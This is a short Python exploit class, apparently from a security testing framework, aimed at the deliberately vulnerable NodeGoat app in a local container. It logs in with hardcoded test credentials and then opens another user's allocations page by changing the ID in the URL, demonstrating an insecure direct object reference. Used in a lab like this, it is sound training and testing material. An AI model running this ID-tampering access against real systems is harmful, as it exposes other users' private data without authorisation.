from data.exploits.base.BasicExploit import BasicExploit
from settings import mapped_port_host

class Exploit(BasicExploit):

	attributes = {
		  "Name" : "Nodegoat_Insecure_DOR",
		  "Description" : "",
		  "Target" : "nodegoat",
		  "Container" : "ubuntu-node-mongo",
		  "Type" : ""
	}

	def runExploit(self):
		wrapper = self.wrapper
		wrapper.navigate("http://localhost:%s/login" % mapped_port_host)
		wrapper.find("userName").keys("goat")
		wrapper.find("password").keys("123")
		wrapper.find("button.btn.btn-danger").click()
		
		wrapper.navigate("http://localhost:%s/allocations/3" % mapped_port_host) 
		self.assertIn("Asset Allocations for Will Smith", wrapper.find("div.panel.panel-info").raw.text, "Exploit didn't work!")
